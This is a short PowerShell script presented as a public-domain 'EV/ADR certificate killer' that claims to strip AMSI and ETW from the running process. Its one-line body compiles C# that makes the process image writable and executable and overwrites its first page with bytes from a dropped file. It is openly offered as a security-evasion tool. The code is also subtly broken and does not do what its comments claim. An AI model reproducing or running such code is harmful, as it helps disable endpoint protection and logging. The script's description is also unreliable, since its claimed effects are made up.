# RawrZ EvAdrKiller.ps1 - Public Domain EV/ADR Certificate Killer
#
# This is free and unencumbered software released into the public domain.
#
# Anyone is free to copy, modify, publish, use, compile, sell, or
# distribute this software, either in source code form or as a compiled
# binary, for any purpose, commercial or non-commercial, and by any
# means.
#
# In jurisdictions that recognize copyright laws, the author or authors
# of this software dedicate any and all copyright interest in the
# software to the public domain. We make this dedication for the benefit
# of the public at large and to the detriment of our heirs and
# successors. We intend this dedication to be an overt act of
# relinquishment in perpetuity of all present and future rights to this
# software under copyright law.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
# OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
# ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
# OTHER DEALINGS IN THE SOFTWARE.
#
# For more information, please refer to <http://unlicense.org/>
#
# Drag-and-drop EV/ADR certificate killer
# Instantly patches current process to zero EV/ADR certificate table & strip AMSI/ETW
$args|%{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"kernel32\")]static extern IntPtr GetModuleHandle(string n);[DllImport(\"kernel32\")]static extern bool VirtualProtect(IntPtr a,uint s,uint f,out uint o);static uint R=0x40;public static void P(string f){IntPtr m=GetModuleHandle(null);uint o;VirtualProtect(m,0x1000,R,out o);IntPtr s=Marshal.AllocHGlobal(0x1000);Marshal.Copy(System.IO.File.ReadAllBytes(f),0,s,0x1000);Marshal.Copy(s,m,0x1000);Marshal.FreeHGlobal(s);}}';[K]::P($_);Write-Host "EV/ADR signatures neutralized for: $_" -ForegroundColor Red}
